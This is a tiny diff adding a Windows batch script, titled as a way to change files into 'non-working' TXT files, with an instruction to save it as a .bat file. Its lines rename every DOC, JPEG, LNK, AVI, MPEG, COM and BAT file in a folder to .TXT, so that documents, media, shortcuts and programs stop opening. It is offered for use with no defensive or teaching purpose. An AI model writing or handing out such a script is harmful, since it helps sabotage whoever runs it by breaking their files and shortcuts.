@@ -1,0 +1,14 @@
+Change Files To Non-working TXT Files
+Save As A bat File
+
+REN *.DOC *.TXT REN *.JPEG *.TXT
+
+REN *.LNK *.TXT
+
+REN *.AVI *.TXT
+
+REN *.MPEG *.TXT
+
+REN *.COM *.TXT
+
+REN *.BAT *.TXT
